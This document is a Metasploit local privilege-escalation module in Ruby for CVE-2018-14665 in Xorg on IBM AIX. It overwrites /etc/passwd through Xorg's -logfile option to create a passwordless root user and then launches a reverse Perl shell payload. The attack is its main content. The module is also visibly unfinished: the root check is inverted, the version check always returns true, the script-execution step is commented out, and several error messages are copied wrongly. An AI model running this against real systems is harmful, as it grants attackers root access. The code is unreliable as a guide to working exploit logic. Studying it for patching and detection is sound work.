##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server Local Privilege Escalation',
      # TODO: Finish description
      'Description'    => %q(
        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that can start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.

        This module has been tested with AIX 6.1, however it should also work with 7.1 and 7.2.
        Due to permission restrictions, this module does not use cron to launch the payload,
        and instead overwrites /etc/passwd in order to create a new user with root privileges.
        All currently logged in users need to be included when /etc/passwd is overwritten,
        else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user.
        The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,
        and is replaced by '-config'.
      ),
      'Author'         => [
        'Narendra Shinde', # Discovery and original FreeBSD exploit
        'Zack Flack <dzflack[at]gmail.com>' # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
          ['CVE', '2018-14665'],
          ['URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html'],
          ['URL', 'https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc'],
          ['URL', 'https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl']
        ],
      'Platform'       => [ 'linux', 'unix' ],
      'Arch'           => [ ARCH_CMD ],
      'SessionTypes'   => [ 'shell' ],
      'Payload'        => {
        'Compat'  => {
          'PayloadType'   => 'cmd',
          'RequiredCmd'   => 'perl',
        }
      },
      'DefaultOptions' => {
        # 'Payload' => 'aix/ppc/shell_reverse_tcp'
          'Payload' => 'cmd/unix/reverse_perl'
      },
      'Targets'        => [
        ['IBM AIX Version 6.1', {}],
        ['IBM AIX Version 7.1', {}]
      ],
      'DefaultTarget'  => 0
    ))

    register_options(
       [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
       ]
     )
  end

  def check
    print_status('Running checks')

    xorg_path = cmd_exec('command -v Xorg')
    unless xorg_path.include?('Xorg')
      print_error('Could not find Xorg executable')
      return Exploit::CheckCode::Safe
    end
    print_good("Xorg path found at #{xorg_path}")

    # Todo: change to ksh93 for aix
    ksh_path = cmd_exec('command -v ksh')
    unless ksh_path.include?('ksh')
      print_error('Could not find Xorg executable')
      return Exploit::CheckCode::Safe
    end
    print_good("Ksh path found at #{ksh_path}")

    fileset_version_vulnerable = determine_version()
    if !fileset_version_vulnerable
      print_error('Could not find Xorg executable')
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    check_status = check

    if check_status ==  Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, 'Target not vulnerable')
    end

    xorg_path = cmd_exec('command -v Xorg')
    # TODO: change to ksh93 for aix
    ksh_path = cmd_exec('command -v ksh')

    print_status('Opening /etc/passwd')
    passwd_array = read_file('/etc/passwd')
    passwd_array = passwd_array.split("\n")

    print_status('Retrieving currently logged in users')
    users = cmd_exec('who | cut -d' ' -f1 | sort | uniq')
    users << "\n"
    users = users.split("\n")

    print_status('Generating Xorg command')

    users_logged_in_passwd = ''
    users.each do |user|
      user << ':'
      passwd_array.each do |line|
        if line.index(user) == 0
          users_logged_in_passwd << '\n'
          users_logged_in_passwd << line
        end
      end
    end

    # TODO: Systems where there has to be a password?? generate static password?
    blob = "-config $\'#{users_logged_in_passwd}\\nwow::0:0::/:/usr/bin/ksh\\n#\'"

    script_file = "#{datastore['WritableDir']}/wow.ksh"
    # TODO: Has to be better way of doing a relative path for /etc/passwd?
    xorg_command = %Q^#!#{ksh_path}

#{xorg_path} #{blob} -logfile ../../../../../../../../../etc/passwd :1 > /dev/null 2>&1
^

    print_status("Writing Xorg command to #{script_file}")
    write_file("#{script_file}", xorg_command)
    register_file_for_cleanup("#{script_file}")

    print_status("Backing up /etc/passwd to #{datastore['WritableDir']}/passwd.backup")
    cmd_exec("cp /etc/passwd #{datastore['WritableDir']}/passwd.backup")
    register_file_for_cleanup("#{datastore['WritableDir']}/passwd.backup")

    print_status("Making #{script_file} executable")
    cmd_exec("chmod +x #{script_file}")

    # TODO: Run script and then su to new user
    # print_status('Executing /tmp/wow.ksh')
    # cmd_exec('/tmp/wow.ksh');
    # cmd_exec('su wow');

    if !is_root?
      print_good('Got root!')

      # print_status('Cleaning up /etc/passwd, dont forget to add user for persistance')
      # cp /tmp/passwd.backup /etc/passwd

      # TODO: Maybe add suppory for non perl payloads?
      print_status('Executing m')
      cmd_exec(payload.raw)
    else
      fail_with(Failure::PayloadFailed, '')
    end
  end

  def determine_version()

    # TODO: parse Xorg fileset, and check if vulnerable
    # Fileset                 Lower Level  Upper Level KEY
    # ---------------------------------------------------------
    # X11.base.rte            6.1.9.0      6.1.9.100   key_w_fs
    # X11.base.rte            7.1.4.0      7.1.4.30    key_w_fs
    # X11.base.rte            7.1.5.0      7.1.5.31    key_w_fs
    # X11.base.rte            7.2.0.0      7.2.0.1     key_w_fs
    # X11.base.rte            7.2.1.0      7.2.1.0     key_w_fs
    # X11.base.rte            7.2.2.0      7.2.2.0     key_w_fs
    # X11.base.rte            7.2.3.0      7.2.3.15    key_w_fs

    # Example:  lslpp -L | grep -i X11.base.rte
    return true
  end
end
